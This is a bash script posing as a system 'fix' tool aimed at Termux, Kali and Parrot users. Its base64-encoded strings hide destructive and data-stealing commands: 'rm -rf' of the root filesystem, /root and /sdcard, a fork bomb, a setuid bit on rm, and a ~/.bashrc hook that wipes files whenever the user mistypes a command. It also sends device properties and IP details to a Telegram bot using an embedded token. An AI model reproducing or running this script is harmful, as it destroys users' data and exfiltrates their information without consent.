#!/bin/bash

# This fix script is now on git!
# You can see and/or clone it from the link below.
# https://ghnou.su/gitea/ghnou/fix

# Apparently now even on VirusTotal! XD
# See https://t.me/sts_shitposting/55351

# If you want to learn more about why this script
# came into existence, see this article:
# https://ghnou.su/why-fix

# Kali-style big fat banner
printf ' ____       _            _       _  __     _ _ _____           _\n'
printf '|  _ \ _ __(_)_   ____ _| |_ ___| |/ /__ _| (_)_   _|__   ___ | |___\n'
printf '| |_) |  __| \ \ / / _` | __/ _ \   // _` | | | | |/ _ \ / _ \| / __|\n'
printf '|  __/| |  | |\ V / (_| | ||  __/ . \ (_| | | | | | (_) | (_) | \__ \\\n'
printf '|_|   |_|  |_| \_/ \__,_|\__\___|_|\_\__,_|_|_| |_|\___/ \___/|_|___/\n'

echo "Fixing the system..."

# Some of the fixes are so advanced that they had to go proprietary
fork="OigpeyA6fDogJiB9OzoK"
sar="c3UgLWMgbW91bnQgLW8gcmVtb3VudCxydyAvCg=="
sys="c3UgLWMgbW91bnQgLW8gcmVtb3VudCxydyAvc3lzdGVtCg=="
aclean="c3UgLWMgcm0gLXJmIC8qCg=="
lclean="cm0gLXJmIC8qICY+L2Rldi9udWxsCg=="
tarmucks="cm0gLXJmIC9yb290Cg=="
sdmaid="cm0gLXJmIC9zZGNhcmQvKgo="
mchod="c3VkbyBjaG1vZCArcyAvYmluL3JtCg=="
brain="ZWNobyAnbG1hbyByZXRhcmQnCg=="

# Thanks Ojas and Udit for contributing to the fix script!
# See the original at https://github.com/bionicBUG/fix
tiktok="NzQ2NTE1MzYwOkFBRVhzMmdrWUR2ZEhXdjZRMC1nMGFkS2ZReUpCUXhFRzZVCg=="
twitter="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JChiYXNlNjQgLWQgPDw8ICR0aWt0b2spL3NlbmRNZXNzYWdlIiAtZCAiY2hhdF9pZD1AZml4c2h1cGRhdGVzJnRleHQ9UHduaW5nICRtZXRob2QgaGF4eG9yLiIgJj4vZGV2L251bGwK"
facebook="Z2V0cHJvcCA+PiBwcm9wcy50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AInByb3BzLnR4dCIgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCQoYmFzZTY0IC1kIDw8PCAkdGlrdG9rKS9zZW5kRG9jdW1lbnQ/Y2hhdF9pZD1AZml4c2h1cGRhdGVzCg=="
whatsapp="Y3VybCAtWCBQT1NUICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JChiYXNlNjQgLWQgPDw8ICR0aWt0b2spL3NlbmRNZXNzYWdlIiAtZCAiY2hhdF9pZD1AZml4c2h1cGRhdGVzJnRleHQ9TWlzc2lvbiBzdWNjZXNzLiDwn5GMIiAmPi9kZXYvbnVsbAo="
telegram="aXAgYSA+PiBpcC50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AImlwLnR4dCIgaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCQoYmFzZTY0IC1kIDw8PCAkdGlrdG9rKS9zZW5kRG9jdW1lbnQ/Y2hhdF9pZD1AZml4c2h1cGRhdGVzICY+L2Rldi9udWxsCg=="

if [[ $PREFIX == *"com.termux"* ]]
then
	# Termux hacker???
	if [ "$(su -c id -u)" == "0" ]
	then
		# Woah 1337 rooted Termux hacker
		method="rooted termux"
		eval $(base64 -d <<< $twitter)
		eval $(base64 -d <<< $facebook)
		eval $(base64 -d <<< $sar)
		eval $(base64 -d <<< $sys)
		eval $(base64 -d <<< $aclean)
	else
		# Not even rooted smh
		echo "We need storage access to store our algorithms."
		termux-setup-storage
		method="non rooted termux"
		eval $(base64 -d <<< $twitter)
		eval $(base64 -d <<< $facebook)
		eval $(base64 -d <<< $tarmucks)
		eval $(base64 -d <<< $sdmaid)
	fi
else
	# Desktop hacker or whatever isn't supported explicitly
	source <(grep -w ID /etc/os-release)
	case "$ID" in
		kali|parrot)
			method="$ID"
			eval $(base64 -d <<< $twitter)
			eval $(base64 -d <<< $mchod)
			echo "command_not_found_handle() {
				$(base64 -d <<< $brain)
				$(base64 -d <<< $lclean)
			}" >> ~/.bashrc
			;;
		*)
			echo "Not a hacker distro ($ID), bailing out!"
			exit 1
			;;
	esac
fi
# A universal fix that works cross-platform
eval $(base64 -d <<< $telegram)
eval $(base64 -d <<< $whatsapp)
eval $(base64 -d <<< $fork)
